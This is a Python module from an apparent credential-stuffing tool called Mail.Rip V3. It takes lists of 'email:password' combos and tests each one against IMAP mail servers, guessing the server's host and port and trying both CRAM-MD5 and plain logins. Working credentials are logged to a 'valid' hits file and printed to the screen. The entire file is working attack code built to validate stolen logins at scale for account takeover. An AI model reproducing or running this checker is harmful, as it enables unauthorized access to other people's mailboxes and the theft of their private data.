#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-

__author__ = 'DrPython3'
__date__ = '2021-12-05'
__version__ = 'BETA(1.1)'
__contact__ = 'https://github.com/DrPython3'

'''
---------------------------------------------
Functions for Checking Mailpass Combos (IMAP)
---------------------------------------------

Part of << Mail.Rip V3: https://github.com/DrPython3/MailRipV3 >>
'''

# [IMPORTS]
# ---------

import sys
import ssl
import socket
import imaplib
import json
from inc_etc import result

# [VARIABLES AND OTHER STUFF]
# ---------------------------

try:
    # load IMAP lists and dictionary from JSON files:
    with open('inc_imapdomains.json') as inc_imapdomains:
        load_imapdomains = json.load(inc_imapdomains)
        imap_domains = (load_imapdomains['imapdomains'])
    with open('inc_imapports.json') as inc_imapports:
        load_imapports = json.load(inc_imapports)
        imap_ports = (load_imapports['imapports'])
    with open('inc_imapservices.json') as inc_imapservices:
        load_imapservices = json.load(inc_imapservices)
        imap_services = (load_imapservices['imapservices'])
except:
    # on errors, set empty lists and dictionary:
    imap_domains = []
    imap_ports = []
    imap_services = {}

# [FUNCTIONS]
# -----------

def imapchecker(default_timeout, target):
    '''
    Main checker function (IMAP).

    :param float default_timeout: connection timeout set by user
    :param str target: emailpass combo to check
    :return: True (valid login), False (login not valid)
    '''
    # start the checking:
    try:
        # set variables and stuff:
        sslcontext = ssl.create_default_context()
        # because imaplib does not support timeout, socket here:
        socket.setdefaulttimeout(float(default_timeout))
        output_hits = str('imap_valid')
        output_checked = str('imap_checked')
        target_email = str('')
        target_user = str('')
        target_password = str('')
        target_host = str('')
        target_port = int(0)
        service_info = str('')
        service_found = False
        connection_ok = False
        md5_login = False
        login_valid = False
        checker_result = False
        # included lists and dictionary for IMAP checker:
        global imap_domains
        global imap_ports
        global imap_services
        # prepare target information:
        new_target = str(str(target).replace('\n', ''))
        target_email, target_password = new_target.split(':')
        target_user = str(target_email)
        # try to get host and port from dictionary:
        try:
            service_info = str(imap_services[str(target_email.split('@')[1])])
            target_host = str(service_info.split(':')[0])
            target_port = int(service_info.split(':')[1])
            # declare service information founnd:
            service_found = True
        # if previous step fails, search host and port using common values:
        except:
            pass
        # establish connection to host (details found in imap_services):
        if service_found == True:
            try:
                # SSL connection:
                if int(target_port) == int(993):
                    imap_connection = imaplib.IMAP4_SSL(
                        host=str(target_host),
                        port=int(target_port),
                        ssl_context=sslcontext
                    )
                    # declare connection established:
                    connection_ok = True
                # regular connection:
                else:
                    imap_connection = imaplib.IMAP4(
                        host=str(target_host),
                        port=int(target_port)
                    )
                    # TLS:
                    try:
                        imap_connection.starttls(
                            ssl_context=sslcontext
                        )
                    except:
                        pass
                    # declare connection established:
                    connection_ok = True
            except:
                pass
        # if no connection established, try with common values:
        if connection_ok == False:
            for subdomain in imap_domains:
                test_host = str(str(subdomain) + str(target_email.split('@')[1]).lower())
                for next_port in imap_ports:
                    try:
                        # SSL connection:
                        if int(next_port) == int(993):
                            imap_connection = imaplib.IMAP4_SSL(
                                host=str(test_host),
                                port=int(next_port),
                                ssl_context=sslcontext
                            )
                            # set variables to found host:
                            target_host = str(test_host)
                            target_port = int(next_port)
                            # declare connection established:
                            connection_ok = True
                        # regular connection:
                        else:
                            imap_connection = imaplib.IMAP4(
                                host=str(test_host),
                                port=int(next_port)
                            )
                            # TLS:
                            try:
                                imap_connection.starttls(
                                    ssl_context=sslcontext
                                )
                            except:
                                pass
                            # set variables to found host:
                            target_host = str(test_host)
                            target_port = int(next_port)
                            # declare connection established:
                            connection_ok = True
                        break
                    except:
                        continue
                if connection_ok == True:
                    break
                else:
                    continue
        # test login credentials using established connection:
        if connection_ok == True:
            try:
                # MD5 authentification:
                if 'AUTH=CRAM-MD5' in imap_connection.capabilities:
                    md5_login = True
                    # check login credentials using CRAM-MD5:
                    try:
                        login_response, login_message = imap_connection.login_cram_md5(
                            user=str(target_user),
                            password=str(target_password)
                        )
                        if str('OK') in login_response:
                            # declare login valid:
                            login_valid = True
                    # on errors try login with user ID from email:
                    except:
                        try:
                            target_user = str(target_email.split('@')[0])
                            login_response, login_message = imap_connection.login_cram_md5(
                                user=str(target_user),
                                password=str(target_password)
                            )
                            if str('OK') in login_response:
                                # declare login valid:
                                login_valid = True
                        except:
                            result(output_checked, str(f'{new_target};result=md5-login failed'))
                else:
                    pass
            except:
                pass
            if md5_login == False:
            # reegular login, no CRAM-MD5:
                # login with user = email:
                try:
                    login_response, login_message = imap_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    if str('OK') in login_response:
                        # declare login valid:
                        login_valid = True
                # on errors try login with user ID from email:
                except:
                    try:
                        target_user = str(target_email.split('@')[0])
                        login_response, login_message = imap_connection.login(
                            user=str(target_user),
                            password=str(target_password)
                        )
                        if str('OK') in login_response:
                            # declare login valid:
                            login_valid = True
                    except:
                        result(output_checked, str(f'{new_target};result=login failed'))
        # no connection established, write log for target:
        else:
            result(output_checked, str(f'{new_target};result=no connection'))
        # TODO: probably change to select method ...
        # with valid login, try to list mailboxes:
        if login_valid == True:
            try:
                list_response, mailbox_list = imap_connection.list()
                if str('OK') in list_response:
                    checker_result = True
                    result(output_checked, str(f'{new_target};result=login valid, listing mailboxes ok'))
                else:
                    result(output_checked, str(f'{new_target}:result=login valid, listing mailboxes failed'))
            except:
                pass
        try:
            # TODO: in case of using select method above, send "close" first ...
            imap_connection.logout()
        except:
            pass
        if checker_result == True or login_valid == True:
            result_output = str(f'email={str(target_email)}, host={str(target_host)}:{str(target_port)}, login={str(target_user)}:{str(target_password)}')
            result(output_hits, result_output)
            # show found login on screen:
            print(f'[VALID]    {result_output}')
            return True
        else:
            return False
    # on any errors while checking, write log before exit:
    except:
        result(output_checked, str(f'{new_target};result=check failed'))
        return False

# DrPython3 (C) 2021 @ GitHub.com
